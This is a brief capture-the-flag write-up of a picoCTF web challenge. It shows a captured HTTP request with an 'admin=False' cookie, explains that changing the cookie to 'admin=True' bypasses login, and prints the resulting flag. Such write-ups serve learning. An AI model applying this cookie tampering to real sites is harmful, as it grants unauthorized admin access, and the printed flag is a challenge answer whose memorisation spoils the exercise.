# Solution

Let's login as a random user and check what the request and response looks like

```
Request

GET https://jupiter.challenges.picoctf.org/problem/44573/flag
Host: jupiter.challenges.picoctf.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://jupiter.challenges.picoctf.org/problem/44573/login
Connection: keep-alive
Cookie: password=; username=asd; admin=False
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
```

It seems like there is no password checking, and there is an `admin=False` flag in the cookie.

Let's change and resend the request as `username=Joe` and `admin=True`

And the response returns our flag
```
picoCTF{th3_c0nsp1r4cy_l1v3s_0c98aacc}
```